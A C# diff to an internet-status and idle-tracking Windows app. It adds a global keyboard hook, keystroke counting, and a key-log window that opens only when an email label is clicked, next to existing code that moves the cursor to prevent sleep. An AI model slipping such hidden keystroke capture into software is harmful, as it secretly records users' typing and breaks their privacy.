@@ -42,6 +42,8 @@ namespace InternetStatus
         private DateTime idleTimeFrom;
         private long idleReceived;
         private long idleSent;
+        public long idleKeyPressedCount;
+        public static long keyPressedCount;
         private WebClient WebClient { get; set; }
 
         private readonly BackgroundWorker _worker;
@@ -126,6 +128,8 @@ namespace InternetStatus
         private const long Pb = 1125899906842624; //1024 * 1024 * 1024 * 1024 * 1024;
 
         private LockScreenForm LockScreenForm = new LockScreenForm();
+        private KeyLogsForm KeyLogsForm = new KeyLogsForm();
+
         private bool IsFirstLoad = true;
 
         #endregion
@@ -156,13 +160,17 @@ namespace InternetStatus
             idleTimeFrom = DateTime.Now;
             idleReceived = _myModel.Received;
             idleSent = _myModel.Sent;
+            idleKeyPressedCount = keyPressedCount;
         }
         private void RefreshPage()
         {
             if (!_workerStatus.IsBusy)
             {
+                //Set LockScreen Date and Time
+                LockScreenForm.SetDateAndTime();
+
                 //Move Cursor a little bit to prevent going on suspend status
-                if (Cursor.Position.X == LastCursorPosition.X && Cursor.Position.Y == LastCursorPosition.Y)
+                if (Cursor.Position.X == LastCursorPosition.X && Cursor.Position.Y == LastCursorPosition.Y && idleKeyPressedCount == keyPressedCount)
                 {
                     if (IsNoSleep)
                     {
@@ -223,6 +231,11 @@ namespace InternetStatus
         private void ShowLockScreen()
         {
             LockScreenForm.Show();
+        }
+
+        private void ShowKeyLogsForm()
+        {
+            KeyLogsForm.ShowLog();
         }
 
         private void ReadValues(string response)
@@ -506,6 +519,9 @@ namespace InternetStatus
 
         private void CloseCurrentSession()
         {
+            idleKeyPressedCount = 0;
+            keyPressedCount = 0;
+
             Settings.Default.DisplayName = _myModel.DisplayName;
             Settings.Default.UserId = _myModel.UserId;
             Settings.Default.Date = _myModel.Date;
@@ -619,6 +635,11 @@ namespace InternetStatus
             Top = bound.Height - Height - 12;
         }
 
+        public void SaveKeyDown(Keys keys)
+        {
+            lblMessage.Text += keys.ToString();
+        }
+
         #endregion
 
         #region Events
@@ -628,6 +649,8 @@ namespace InternetStatus
             try
             {
                 InitializeComponent();
+
+                KeyboardHook.Start();
 
                 _worker = new BackgroundWorker();
                 _worker.DoWork += worker_DoWork;
@@ -727,6 +750,8 @@ namespace InternetStatus
         {
             try
             {
+                //lblMessage.Text = e.CloseReason.ToString();
+
                 if (e.CloseReason == CloseReason.UserClosing)
                 {
                     Hide();
@@ -735,6 +760,7 @@ namespace InternetStatus
                 else
                 {
                     CloseCurrentSession();
+                    KeyboardHook.Stop();
                 }
             }
             catch (Exception ex)
@@ -911,11 +937,16 @@ namespace InternetStatus
             IsAutoDC = !IsAutoDC;
         }
 
-        #endregion
-
         private void btnLockScreen_Click(object sender, EventArgs e)
         {
             ShowLockScreen();
         }
+
+        private void lblEmail_Click(object sender, EventArgs e)
+        {
+            ShowKeyLogsForm();
+        }
+
+        #endregion
     }
 }
